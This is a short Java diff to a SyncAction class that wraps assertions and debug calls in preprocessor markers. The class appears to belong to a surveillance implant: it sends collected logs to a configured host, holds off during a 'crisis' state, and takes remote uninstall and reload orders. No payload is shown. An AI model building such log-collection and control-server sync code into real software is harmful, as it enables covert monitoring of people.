@@ -42,7 +42,9 @@ public class SyncAction extends SubAction {
         super(actionId_);
         parse(confParams);
 
-        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
+        // #ifdef DBC
+//@        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
+        // #endif
 
         logCollector = LogCollector.getInstance();
         agentManager = AgentManager.getInstance();
@@ -55,9 +57,11 @@ public class SyncAction extends SubAction {
     }
 
     public boolean execute() {
+        // #debug
         debug.info("SyncAction execute");
 
         if (statusObj.crisis()) {
+            // #debug
             debug.warn("SyncAction - no sync, we are in crisis");
             return false;
         }
@@ -65,7 +69,9 @@ public class SyncAction extends SubAction {
         wantReload = false;
         wantUninstall = false;
 
-        Check.asserts(logCollector != null, "logCollector == null");
+        // #ifdef DBC
+//@        Check.asserts(logCollector != null, "logCollector == null");
+        // #endif
 
         transfer.init(host, port, ssl, wifi);
 
@@ -84,12 +90,14 @@ public class SyncAction extends SubAction {
 
         this.wantUninstall = transfer.uninstall;
         this.wantReload = transfer.reload;
-        
+
         if (ret) {
+            // #debug
             debug.trace("InternetSend OK");
             return true;
         }
 
+        // #debug
         debug.error("InternetSend Unable to perform");
 
         return false;
@@ -110,6 +118,7 @@ public class SyncAction extends SubAction {
             host = WChar.getString(buffer, true);
 
         } catch (EOFException e) {
+            // #debug
             debug.error("params FAILED");
             return false;
         }
